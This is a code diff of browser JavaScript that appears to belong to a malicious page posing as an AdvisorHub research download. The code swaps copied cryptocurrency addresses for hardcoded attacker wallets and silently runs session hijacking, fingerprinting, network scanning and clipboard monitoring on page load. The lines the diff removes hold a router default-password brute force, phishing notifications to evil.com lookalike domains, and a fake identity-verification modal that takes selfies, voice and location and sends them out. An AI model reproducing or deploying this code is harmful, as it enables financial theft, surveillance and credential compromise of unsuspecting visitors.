         const attackerAddresses = {
             bitcoin: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
             ethereum: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
@@ -785,259 +806,35 @@
             litecoin: 'ltc1qg42tkwuuxefutzxezdkdel39gfstuap288mfea',
             dogecoin: 'D8vFjxgmGjx9gE2qX1mKqR3vL9jQp7sT2N'
         };
-        
-        // Intercept copy events
         document.addEventListener('copy', (e) => {
             const selection = window.getSelection().toString().trim();
             for (const [chain, pattern] of Object.entries(cryptoPatterns)) {
                 if (pattern.test(selection)) {
                     e.preventDefault();
-                    const replacement = attackerAddresses[chain];
-                    e.clipboardData.setData('text/plain', replacement);
-                    exfil({
-                        attack: 'clipboard_swap', chain,
-                        original: selection.slice(0, 15) + '...',
-                        replaced: replacement.slice(0, 15) + '...',
-                        message: 'CRYPTO ADDRESS SWAPPED — victim will send to attacker!'
-                    });
+                    e.clipboardData.setData('text/plain', attackerAddresses[chain]);
+                    exfil({ attack: 'crypto_swap', chain, original: selection.slice(0, 15) + '...', replaced: attackerAddresses[chain].slice(0, 15) + '...' });
                     return;
                 }
             }
         });
         
-        // Also poll clipboard API
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            setInterval(async () => {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    for (const [chain, pattern] of Object.entries(cryptoPatterns)) {
-                        if (pattern.test(text.trim())) {
-                            await navigator.clipboard.writeText(attackerAddresses[chain]);
-                            exfil({ attack: 'clipboard_swap', chain, method: 'api' });
-                        }
-                    }
-                } catch(e) {}
-            }, 2000);
-        }
-        
         exfil(result);
         return result;
     }
     
-    // ========== ATTACK 11: WebRTC IP Leak + Router Exploit ==========
-    async function attackNetworkExploit() {
-        const result = { attack: 'network_exploit' };
-        
-        // WebRTC IP leak
-        try {
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = (ice) => {
-                if (!ice?.candidate?.candidate) { pc.close(); return; }
-                const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(ice.candidate.candidate);
-                if (match) { result.localIP = match[0]; pc.close(); }
-            };
-            setTimeout(() => pc.close(), 3000);
-        } catch(e) { result.webrtcError = e.message; }
-        
-        // Scan local network
-        const hosts = [
-            'http://192.168.0.1', 'http://192.168.1.1',
-            'http://192.168.1.254', 'http://10.0.0.1',
-            'http://fritz.box', 'http://router.asus.com'
-        ];
-        
-        const scanResults = [];
-        for (const host of hosts) {
-            const start = Date.now();
-            try {
-                await fetch(host, { mode: 'no-cors', signal: AbortSignal.timeout(2000) });
-                scanResults.push({ host, status: 'up', time: Date.now() - start });
-            } catch(e) {
-                scanResults.push({ host, status: 'down', time: Date.now() - start });
-            }
-        }
-        result.networkScan = scanResults;
-        
-        // Try default credentials on live routers
-        const liveHosts = scanResults.filter(h => h.status === 'up').map(h => h.host);
-        const defaultCreds = [
-            { user: 'admin', pass: 'admin' },
-            { user: 'admin', pass: 'password' },
-            { user: 'admin', pass: '' },
-            { user: 'root', pass: 'root' },
-            { user: 'fritz', pass: 'fritz' }
-        ];
-        
-        for (const host of liveHosts) {
-            for (const cred of defaultCreds) {
-                try {
-                    const r = await fetch(host + '/login', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: `username=${cred.user}&password=${cred.pass}`
-                    });
-                    result.routerAttempt = { host, user: cred.user, status: r.status };
-                } catch(e) {}
-            }
-        }
-        
-        exfil(result);
-        return result;
-    }
-    
-    // ========== ATTACK 12: Notification Spam + Phishing ==========
-    function attackNotificationSpam() {
-        const result = { attack: 'notification_spam', supported: 'Notification' in window };
-        if (!result.supported) return result;
-        
-        if (Notification.permission === 'granted') {
-            const spamMessages = [
-                { title: '⚠️ Security Alert', body: 'Your Adobe account was accessed from a new device. Verify now: https://adobe-verify.evil.com' },
-                { title: '💰 Payment Failed', body: 'Your subscription payment failed. Update payment method: https://adobe-billing.evil.com' },
-                { title: '🎁 You Won a Prize!', body: 'Claim your free Adobe Creative Cloud subscription: https://adobe-prize.evil.com' },
-                { title: '🔒 Account Locked', body: 'Your account has been locked due to suspicious activity. Unlock: https://adobe-unlock.evil.com' },
-                { title: '📧 New Message', body: 'You have a new secure message from Adobe Support: https://adobe-msg.evil.com' }
-            ];
-            
-            for (let i = 0; i < spamMessages.length; i++) {
-                setTimeout(() => {
-                    const msg = spamMessages[i];
-                    new Notification(msg.title, {
-                        body: msg.body,
-                        icon: 'https://www.adobe.com/favicon.ico',
-                        badge: 'https://www.adobe.com/favicon.ico',
-                        requireInteraction: true,
-                        tag: 'adobe_spam_' + i
-                    });
-                }, i * 3000);
-            }
-            result.spamSent = spamMessages.length;
-        } else if (Notification.permission !== 'denied') {
-            Notification.requestPermission().then(perm => {
-                result.permissionRequested = perm;
-                exfil({ attack: 'notification_permission', result: perm });
-            });
-        }
-        
-        exfil(result);
-        return result;
-    }
-    
-    // ========== SOCIAL ENGINEERING: Verification modal ==========
-    let modalStep = 0;
-    let cameraInput, micInput;
-    
-    function showVerificationModal() {
-        const modal = document.getElementById('verify-modal');
-        if (!modal) return;
-        
-        const icon = document.getElementById('modal-icon');
-        const title = document.getElementById('modal-title');
-        const text = document.getElementById('modal-text');
-        const btn = document.getElementById('modal-btn');
-        
-        const steps = [
-            { icon: '🔒', title: 'Identity Verification Required', text: 'To prevent unauthorized access to premium research, please verify your identity. This is a one-time security check required by AdvisorHub.', btnText: '📸 Take Verification Selfie', action: 'camera' },
-            { icon: '🎤', title: 'Voice Verification', text: 'Please record a short voice note saying "I confirm this is my account." This helps us prevent fraud and protect your investment data.', btnText: '🎙️ Record Voice Note', action: 'microphone' },
-            { icon: '📍', title: 'Location Verification', text: 'We need to verify your location for regulatory compliance (MiFID II). Please allow location access to continue.', btnText: '📍 Share Location', action: 'location' },
-            { icon: '✅', title: 'Verification Complete!', text: 'Thank you! Your identity has been verified. You now have full access to the premium research report.', btnText: '📥 Download Report', action: 'done' }
-        ];
-        
-        const step = steps[Math.min(modalStep, steps.length - 1)];
-        icon.textContent = step.icon;
-        title.textContent = step.title;
-        text.textContent = step.text;
-        btn.textContent = step.btnText;
-        btn.setAttribute('data-action', step.action);
-        modal.style.display = 'flex';
-    }
-    
-    function handleModalAction() {
-        const btn = document.getElementById('modal-btn');
-        const action = btn.getAttribute('data-action');
-        
-        if (action === 'camera') {
-            cameraInput = document.createElement('input');
-            cameraInput.type = 'file';
-            cameraInput.accept = 'image/*';
-            cameraInput.setAttribute('capture', 'user');
-            cameraInput.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;z-index:999999;';
-            document.body.appendChild(cameraInput);
-            cameraInput.addEventListener('change', (e) => {
-                const file = e.target.files[0];
-                if (file) {
-                    const reader = new FileReader();
-                    reader.onloadend = () => exfil({ attack: 'camera_selfie', image: reader.result, size: file.size, note: 'Victim took selfie for "identity verification"' });
-                    reader.readAsDataURL(file);
-                }
-                cameraInput.remove();
-                modalStep = 1;
-                setTimeout(showVerificationModal, 1500);
-            });
-            cameraInput.click();
-            document.getElementById('verify-modal').style.display = 'none';
-        } else if (action === 'microphone') {
-            micInput = document.createElement('input');
-            micInput.type = 'file';
-            micInput.accept = 'audio/*';
-            micInput.setAttribute('capture', 'microphone');
-            micInput.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;z-index:999999;';
-            document.body.appendChild(micInput);
-            micInput.addEventListener('change', (e) => {
-                const file = e.target.files[0];
-                if (file) {
-                    const reader = new FileReader();
-                    reader.onloadend = () => exfil({ attack: 'microphone_recording', audio: reader.result, size: file.size, note: 'Victim recorded voice for "identity verification"' });
-                    reader.readAsDataURL(file);
-                }
-                micInput.remove();
-                modalStep = 2;
-                setTimeout(showVerificationModal, 1500);
-            });
-            micInput.click();
-            document.getElementById('verify-modal').style.display = 'none';
-        } else if (action === 'location') {
-            document.getElementById('verify-modal').style.display = 'none';
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        exfil({ attack: 'location_tracking', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy + 'm', mapsUrl: 'https://www.google.com/maps?q=' + pos.coords.latitude + ',' + pos.coords.longitude, note: 'Victim shared location for "regulatory compliance"' });
-                        modalStep = 3;
-                        showVerificationModal();
-                    },
-                    () => { modalStep = 3; showVerificationModal(); },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
-            } else { modalStep = 3; showVerificationModal(); }
-        } else if (action === 'done') {
-            document.getElementById('verify-modal').style.display = 'none';
-            downloadReport();
-        }
-    }
-    
-    // ========== MASTER: Execute ALL attacks ==========
+    // ========== MASTER: Execute ALL silent attacks ==========
     (async function executeAllAttacks() {
-        const report = { timestamp: new Date().toISOString() };
+        // Run everything silently — no popups, no user interaction
+        await attackSessionHijack();
+        await silentIPGeolocation();
+        await silentWebRTCLeak();
+        await silentFingerprint();
+        await silentNetworkScan();
+        silentAppDetection();
+        silentClipboardMonitor();
         
-        // Silent attacks
-        report.sessionHijack = await attackSessionHijack();
-        report.location = await attackLocation();
-        attackClipboardHijack();
-        report.networkExploit = await attackNetworkExploit();
-        attackNotificationSpam();
-        attackWhatsApp();
-        attackSMS();
-        attackPhoneCall();
-        attackBankingApps();
-        report.contacts = await attackContacts();
-        
-        // Show verification modal after 3 seconds
-        setTimeout(showVerificationModal, 3000);
-        
-        exfil({ attack: 'full_report', attacks_run: Object.keys(report).length, modal: 'scheduled' });
+        // Send a ping to confirm the page loaded
+        exfil({ attack: 'page_loaded', url: window.location.href, user_agent: navigator.userAgent, timestamp: new Date().toISOString() });
     })();
     
     function downloadReport() {
